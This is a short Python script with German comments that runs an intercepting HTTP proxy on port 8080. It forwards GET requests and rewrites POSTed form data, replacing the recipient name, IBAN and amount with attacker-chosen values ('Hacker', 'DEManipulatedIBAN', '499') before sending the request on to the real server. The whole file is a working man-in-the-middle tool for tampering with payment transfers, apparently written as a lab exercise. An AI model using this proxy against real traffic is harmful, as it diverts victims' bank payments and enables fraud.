import http.server
import socketserver
import urllib.request

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        # Request an Server senden
        req = urllib.request.urlopen(self.path)
        self.send_response(req.getcode())
        self.end_headers()
        self.wfile.write(req.read())

    def do_POST(self):
        # Payload Request lesen
        length = int(self.headers['Content-Length'])
        payload = self.rfile.read(length)

         # Payload umwandeln
        payload = urllib.parse.parse_qs(payload)
        print(payload) # testen welche payload geschickt

        # payload maniplulieren
        payload[b'name'] = [b'Hacker'] # "b" - String lateral um binäre Daten zu repräsentaieren 
        payload[b'iban'] = [b'DEManipulatedIBAN']
        payload[b'amount'] = [b'499']
        print(payload) #manipulierte payload

        # payload wieder in bytes umwandeln
        payload = urllib.parse.urlencode(payload, doseq=True).encode()
        
        # content-length updaten um den Fehler password gleicher Länge zu vermieden
        self.headers['Content-Length'] = str(len(payload))

         # manipulierte Request wieder an Server schicken
        req = urllib.request.Request(self.path, data=payload, headers=self.headers, method="POST")
        res = urllib.request.urlopen(req)

        # antwort vom server an client schicken
        self.send_response(res.getcode())
        self.end_headers()
        self.wfile.write(res.read())

# Start the server
try:
    socketserver.TCPServer(('', 8080), MyHTTPRequestHandler).serve_forever()
except Exception as e:
    print(e)
